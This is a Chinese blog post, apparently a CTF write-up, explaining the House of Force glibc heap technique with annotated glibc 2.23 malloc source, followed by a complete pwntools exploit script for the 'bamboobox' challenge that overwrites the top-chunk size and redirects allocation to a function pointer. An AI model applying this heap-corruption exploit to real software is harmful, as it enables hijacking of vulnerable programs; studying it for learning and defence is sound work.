@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        House Of Force - 萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+     你若盛开，清风自来！ 
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            萝卜
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#再分配chunk大小的计算"><span class="toc-text">再分配chunk大小的计算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bamboobox"><span class="toc-text">bamboobox</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        House Of Force
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-10-30 13:29:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content no-indent">
+        <p>利用该漏洞必要的前提条件：</p>
+<ul>
+<li>能够控制top chunk的size字段</li>
+<li>malloc的size可控</li>
+</ul>
+<p>在这个过程中，av-&gt;top会根据我们malloc的大小而改变</p>
+<p>改变规则：当前top地址加上我们输入的大小（对齐后）</p>
+<p>eg：<br>malloc地址：0x601010<br>top chunk地址：0x602020<br>将topchunk的size覆盖成-1(<code>0xffffffffffffffff</code>)<br>申请(0x601020-0x602020)大小的chunk<br>再申请的时候就会从0x601010开始分配</p>
+<h2 id="再分配chunk大小的计算"><a href="#再分配chunk大小的计算" class="headerlink" title="再分配chunk大小的计算"></a>再分配chunk大小的计算</h2><blockquote>
+<p>这计算的我有点晕，搞了几个小时，还是迷迷糊糊的</p>
+</blockquote>
+<p>要满足的需要条件：remainder_size &gt;= 最后分配chunk大小（带head头部）</p>
+<p>我们输入负数地址在_int_malloc的处理</p>
+<p>首先是<code>checked_request2size (bytes, nb);</code>，这里面计算的是我们输入的size加上head头部总大小，存在nb中，当我们输入负数的时候，在内存中会转换成无符号整形的一个很大的数，而<code>checked_request2size</code>中计算中不是以负数来算的，所以说我们在输入size的时候要在原来的基础上减去<code>0x10</code></p>
+<p>接着到<code>use top</code>的关键代码<br>glibc源码分析：（<code>glibc-2.23/malloc/malloc.c</code>）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">     less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">     be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">     limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">     MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">     exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">     reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">     to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;<span class="comment">//获取当前top chunk的地址</span></span><br><span class="line">  size = chunksize (victim);<span class="comment">//获取当前top chunk的size</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))<span class="comment">//检测剩余的大小够不够我们输入负数时要分配的size</span></span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;<span class="comment">//剩下的大小</span></span><br><span class="line">      remainder = chunk_at_offset (victim, nb);<span class="comment">//计算分配后的top chunk的位置，在这个宏里面，nb被当作有符号的数来运算，也就是说会当作负数来运算</span></span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));<span class="comment">//设置本次分配的prev_size字段</span></span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);<span class="comment">//设置top chunk的prev_size字段</span></span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="bamboobox"><a href="#bamboobox" class="headerlink" title="bamboobox"></a>bamboobox</h2><p>存在堆溢出，malloc时的size可控，并且是int类型<br>所以我们可以利用HOF来获取flag<br>Exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">debug = 1</span><br><span class="line">file_name = &apos;./bamboobox&apos;</span><br><span class="line">libc_name = &apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span><br><span class="line">ip = &apos;&apos;</span><br><span class="line">prot = &apos;&apos;</span><br><span class="line">if debug:</span><br><span class="line">    r = process(file_name)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">else:</span><br><span class="line">    r = remote(ip,int(prot))</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">file = ELF(file_name)</span><br><span class="line"></span><br><span class="line">sl = lambda x : r.sendline(x)</span><br><span class="line">sd = lambda x : r.send(x)</span><br><span class="line">sla = lambda x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = lambda x : r.recvuntil(x,drop=True)</span><br><span class="line">ru = lambda x : r.recvuntil(x)</span><br><span class="line">li = lambda name,x : log.info(name+&apos;:&apos;+hex(x))</span><br><span class="line">ri = lambda  : r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create(chunk_size,value):</span><br><span class="line">    ru(&apos;Your choice:&apos;)</span><br><span class="line">    sl(&apos;2&apos;)</span><br><span class="line">    ru(&apos;Please enter the length of item name:&apos;)</span><br><span class="line">    sl(str(chunk_size))</span><br><span class="line">    ru(&apos;Please enter the name of item:&apos;)</span><br><span class="line">    sl(value)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    ru(&apos;Your choice:&apos;)</span><br><span class="line">    sl(&apos;4&apos;)</span><br><span class="line">    ru(&apos;Please enter the index of item:&apos;)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    ru(&apos;Your choice:&apos;)</span><br><span class="line">    sl(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">def edit(index,size,value):</span><br><span class="line">    ru(&apos;Your choice:&apos;)</span><br><span class="line">    sl(&apos;3&apos;)</span><br><span class="line">    ru(&apos;Please enter the index of item:&apos;)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(&quot;Please enter the length of item name:&quot;)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(&apos;Please enter the new name of the item:&apos;)</span><br><span class="line">    sl(value)</span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    raw_input()</span><br><span class="line">magic = 0x000000000400D49</span><br><span class="line">create(0x20,&quot;\x00&quot;)</span><br><span class="line">edit(0,0x30,&quot;a&quot;*0x28+&quot;\xf1\xff\xff\xff\xff\xff\xff\xff&quot;)</span><br><span class="line">debug()</span><br><span class="line">create(-0x50-0x10,&quot;\x00&quot;)</span><br><span class="line"># create(0x10,p64(0x1)+p64(0x2))</span><br><span class="line">create(0x10,p64(magic)*2)</span><br><span class="line">ru(&apos;Your choice:&apos;)</span><br><span class="line">sl(&apos;5&apos;)</span><br><span class="line"># debug()</span><br><span class="line">ri()</span><br></pre></td></tr></table></figure></p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
